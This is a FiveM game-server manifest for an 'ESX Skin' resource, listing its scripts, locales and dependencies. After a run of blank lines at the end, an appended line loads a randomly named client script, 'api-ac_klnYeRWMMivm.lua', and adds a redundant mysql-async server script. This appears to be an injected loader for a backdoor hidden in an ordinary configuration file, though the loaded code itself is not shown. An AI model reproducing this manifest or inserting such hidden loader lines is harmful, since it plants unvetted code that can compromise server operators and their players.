fx_version "bodacious"

games {"gta5"}
lua54 'yes'
shared_script '@Handler/shared/shared.lua'
description 'ESX Skin'

version '1.1.0'

server_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'@oxmysql/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'skinchanger'
}









client_script "api-ac_klnYeRWMMivm.lua"server_scripts { '@mysql-async/lib/MySQL.lua' }